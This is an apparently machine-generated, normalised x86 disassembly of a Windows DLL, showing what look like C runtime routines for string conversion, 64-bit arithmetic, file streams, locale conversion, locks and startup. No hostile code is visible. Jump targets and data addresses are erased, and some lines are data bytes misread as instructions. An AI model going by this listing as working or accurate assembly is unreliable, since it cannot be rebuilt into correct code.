cmp [ ecx ] 0x0
lea eax [ ecx + 0x2 ]
je r-xdata
sub eax ecx
sar eax 0x1
dec eax
retn
mov dx [ eax ]
inc eax
inc eax
test dx dx
jne r-xdata
sub_1000a57b
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a5a8
mov eax [ ebp + 0xc ]
add esp 0x10
pop ebp
retn
sub_1000a5a8
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
je r-xdata
mov esi [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov [ ecx ] 0x2d
inc ecx
neg esi
jmp r-xdata
add bl 0x30
add bl 0x57
jmp r-xdata
mov edi ecx
mov eax esi
xor edx edx
div [ ebp + 0x10 ]
mov eax esi
mov ebx edx
xor edx edx
div [ ebp + 0x10 ]
cmp ebx 0x9
mov esi eax
jbe r-xdata
and [ ecx ] 0x0
dec ecx
mov [ ecx ] bl
inc ecx
test esi esi
ja r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
mov [ edi ] al
dec ecx
inc edi
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000a610
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_1000a63f
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_10009dc8
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_10009dc8
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_1000a6d5
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x4
retn
push 0x4
push [ esp + 0x8 ]
call sub_10009dc8
pop ecx
pop ecx
retn
sub_1000a700
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1000a7c0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_1000a7f4
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
je r-xdata
push esi
call sub_1000da47
push esi
call sub_1000a825
push esi
mov edi eax
call sub_1000da99
add esp 0xc
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
sub_1000a825
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x83
je r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
pop edi
pop esi
retn
push esi
call sub_1000eace
push esi
mov edi eax
call sub_1000ea75
push [ esi + 0x10 ]
call sub_1000e995
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_10009e3d
and [ esi + 0x1c ] 0x0
pop ecx
sub_1000a871
push ebp
mov ebp esp
push esi
push [ ebp + 0x14 ]
call sub_1000da47
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a8a0
push [ ebp + 0x14 ]
mov esi eax
call sub_1000da99
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_1000a8a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
test edi edi
mov [ ebp + 0x8 ] eax
mov ebx edi
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_1000b3af
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx eax
mov edi ebx
jb r-xdata
mov eax edi
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp + 0x14 ] eax
test eax eax
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push esi
call sub_1000eace
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_1000d1e0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x1
mov edi ebx
mov eax ebx
xor edx edx
div [ ebp + 0x14 ]
mov edi ebx
sub edi edx
jmp r-xdata
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] eax
sub ebx eax
cmp eax edi
jb r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi + 0x10 ]
call sub_1000ebd7
add esp 0xc
cmp eax 0xffffffff
je r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
sub_1000a9aa
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call sub_1000da47
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a9d6
push [ ebp + 0x8 ]
mov esi eax
call sub_1000da99
add esp 0x14
mov eax esi
pop esi
pop ebp
retn
sub_1000a9d6
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_1000d588
mov [ eax ] 0x16
or eax 0xffffffff
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
and al 0xef
cmp edi 0x1
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_1000eace
mov eax [ esi + 0xc ]
pop ecx
test al 0x80
je r-xdata
push esi
call sub_1000ee9f
add [ esp + 0x14 ] eax
pop ecx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and al 0xfc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ esp + 0x14 ]
push [ esi + 0x10 ]
call sub_1000edc7
add esp 0xc
xor ecx ecx
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
jmp r-xdata
test al 0x8
je r-xdata
pop edi
pop esi
retn
test ah 0x4
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_1000aa63
push esi
call sub_1000f170
mov esi eax
test esi esi
jne r-xdata
push edi
push esi
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
call sub_1000f000
push esi
mov edi eax
call sub_1000da99
add esp 0x14
mov eax edi
pop edi
pop esi
retn
pop esi
retn
sub_1000aaa7
push esi
call sub_1000f32a
push [ rw-data ]
call sub_1000f356
mov edx [ rw-data ]
pop ecx
mov ecx [ rw-data ]
mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
jae r-xdata
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
add [ rw-data ] 0x4
mov esi eax
push edx
call sub_1000f356
add eax 0x10
push eax
push [ rw-data ]
call sub_100093be
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
xor esi esi
jmp r-xdata
call sub_1000f333
mov eax esi
pop esi
retn
sub_1000ab37
push 0x80
call sub_100096ed
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
push 0x18
call sub_1000b1a6
mov eax [ rw-data ]
pop ecx
sub_1000ab66
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000abc3
add esp 0xc
mov [ ebp + 0x10 ] eax
test ebx ebx
je r-xdata
push esi
call edi
push 0x13
call sub_1000b26e
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_1000b2cf
pop ecx
jmp r-xdata
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000abc3
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor ebx ebx
xor edi edi
cmp esi ebx
mov [ ebp - 0x8 ] ebx
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
push ebx
push 0xffffffff
push [ ebp + 0xc ]
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0xc ]
call sub_1000a55e
pop ecx
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
call sub_1000d588
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ rw-data ] 0x1
jne r-xdata
cmp edx ebx
jbe r-xdata
dec eax
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edi [ WideCharToMultiByte@IAT ]
push eax
push ebx
push edx
push esi
push 0xffffffff
push [ ebp + 0xc ]
push 0x220
push [ rw-data ]
call edi
mov esi eax
cmp esi ebx
je r-xdata
cmp edx ebx
jbe r-xdata
mov eax edi
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push ebx
push edx
push esi
push edx
push [ ebp + 0xc ]
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
push edx
push [ ebp + 0xc ]
call sub_1000ad72
pop ecx
mov [ ebp + 0x10 ] eax
pop ecx
mov edx eax
mov al [ ecx ]
mov [ edi + esi ] al
mov ax [ ecx ]
inc ecx
inc ecx
test ax ax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
lea eax [ esi - 0x1 ]
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
inc edi
cmp edi edx
jb r-xdata
cmp esi [ ebp + 0x10 ]
jae r-xdata
cmp [ eax + esi - 0x1 ] bl
jne r-xdata
cmp [ ecx ] 0xff
ja r-xdata
mov eax esi
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push ebx
push [ rw-data ]
lea eax [ ebp - 0x2 ]
push eax
push 0x1
push [ ebp + 0xc ]
push ebx
push [ rw-data ]
call edi
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
lea ecx [ eax + esi ]
cmp ecx [ ebp + 0x10 ]
ja r-xdata
xor edx edx
cmp eax ebx
jle r-xdata
add [ ebp + 0xc ] 0x2
jmp r-xdata
mov cl [ ebp + edx - 0x2 ]
mov eax [ ebp + 0x8 ]
cmp cl bl
mov [ esi + eax ] cl
je r-xdata
inc edx
inc esi
cmp edx [ ebp - 0xc ]
jl r-xdata
sub_1000ad72
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor edx edx
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
pop ebp
retn
cmp [ eax ] dx
je r-xdata
cmp ecx edx
je r-xdata
inc eax
inc eax
dec ecx
jne r-xdata
cmp [ eax ] dx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
inc eax
pop ebp
retn
sub_1000ada1
push esi
mov esi ecx
push 0x1b
mov [ esi ] r--data
call sub_1000b26e
mov esi [ esi + 0x4 ]
pop ecx
test esi esi
je r-xdata
push 0x1b
call sub_1000b2cf
pop ecx
pop esi
retn
push esi
call sub_10009e3d
pop ecx
sub_1000adf0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov edi [ esp + 0x8 ]
push esi
test edi 0x3
push ebx
je r-xdata
mov eax [ edi ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add edi 0x4
test eax 0x81010100
je r-xdata
mov al [ edi ]
inc edi
test al al
je r-xdata
mov eax [ edi - 0x4 ]
test al al
je r-xdata
dec edi
jmp r-xdata
test edi 0x3
jne r-xdata
sub edi 0x4
test ah ah
je r-xdata
mov esi [ esp + 0x14 ]
test esi 0x3
jne r-xdata
mov dl [ esi ]
inc esi
test dl dl
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
sub edi 0x3
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
mov [ edi ] dl
inc edi
dec ecx
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
sub edi 0x2
jmp r-xdata
test eax 0xff000000
jne r-xdata
mov [ edi ] cl
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov ecx ebx
and ecx 0x3
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
test dh dh
je r-xdata
mov dl [ esi ]
inc esi
mov [ edi ] dl
inc edi
test dl dl
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edx 0xff0000
je r-xdata
pop ebx
pop esi
dec ecx
jne r-xdata
mov [ edi ] dx
xor edx edx
mov eax [ esp + 0x10 ]
mov [ edi + 0x2 ] dl
pop ebx
pop esi
pop edi
retn
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
sub_1000af13
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
leave
retn 0x8
sub_1000af50
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_1000a4b2
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_1000a470
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_1000a4b2
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_1000a546
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_1000b030
mov eax [ esp + 0x8 ]
cmp eax 0x1
jne r-xdata
xor ecx ecx
cmp eax ecx
jne r-xdata
call [ GetVersion@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_1000d0d2
test eax eax
pop ecx
je r-xdata
cmp eax 0x3
jne r-xdata
cmp [ rw-data ] ecx
jle r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
xor ecx ecx
mov cl [ rw-data ]
and eax 0xff
shr [ rw-data ] 0x10
mov [ rw-data ] eax
mov [ rw-data ] ecx
shl eax 0x8
add eax ecx
mov [ rw-data ] eax
call sub_1000e66c
test eax eax
jne r-xdata
push 0x1
pop eax
push ecx
call sub_1000e758
pop ecx
dec [ rw-data ]
cmp [ rw-data ] ecx
jne r-xdata
retn 0xc
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1000fa4e
mov [ rw-data ] eax
call sub_1000f538
call sub_1000f801
call sub_1000f748
call sub_1000f238
inc [ rw-data ]
jmp r-xdata
call sub_1000d12f
call sub_1000f6f4
call sub_1000e6c0
call sub_1000d12f
jmp r-xdata
call sub_1000f276
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_1000b030
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_100079b0
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_1000b030
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_1000b030
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_1000b1a6
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
call sub_1000fb80
test eax eax
jne r-xdata
push [ esp + 0x4 ]
call sub_1000fbb9
push 0xff
call [ rw-data ]
pop ecx
pop ecx
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1000b202
push esi
push edi
mov edi [ DeleteCriticalSection@IAT ]
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push [ rw-data ]
call edi
push [ rw-data ]
call edi
push [ rw-data ]
call edi
push [ rw-data ]
call edi
pop edi
pop esi
retn
cmp esi rw-data
je r-xdata
cmp esi rw-data
je r-xdata
cmp esi rw-data
je r-xdata
push eax
call edi
push [ esi ]
call sub_10009e3d
pop ecx
sub_1000b26e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
cmp [ eax * 4 + rw-data ] 0x0
lea esi [ eax * 4 + rw-data ]
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push edi
push 0x18
call sub_100096ed
mov edi eax
pop ecx
test edi edi
jne r-xdata
push 0x11
call sub_1000b26e
cmp [ esi ] 0x0
pop ecx
push edi
jne r-xdata
push 0x11
call sub_1000b1a6
pop ecx
call sub_10009e3d
pop ecx
call [ InitializeCriticalSection@IAT ]
mov [ esi ] edi
jmp r-xdata
push 0x11
call sub_1000b2cf
pop ecx
pop edi
sub_1000b2e4
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_10009dc8
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_1000fda8
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_1000b3af
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_1000ebd7
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_1001003b
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_1000ebd7
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_1000fff7
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov ecx ebx
mov eax ebx
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_1000edc7
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_1000b4c7
push ebp
mov ebp esp
sub esp 0x24c
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ecx ecx
push edi
mov [ ebp - 0x10 ] ecx
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp + 0xc ] esi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov edi 0x800
mov edx 0x200
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov esi [ ebp + 0xc ]
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp + 0xc ] esi
jne r-xdata
jmp [ eax * 4 + jump_table_1000bc45 ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x3c ]
mov edx 0x200
mov edi 0x800
xor eax eax
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x2c ] eax
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
and [ ebp - 0x2c ] 0x0
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ ecx + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x3c ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x28 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000bd03
test eax eax
pop ecx
mov [ ebp - 0x28 ] eax
jge r-xdata
mov eax [ ebp - 0x8 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000bd03
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
jge r-xdata
cmp [ esi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_1000bc65
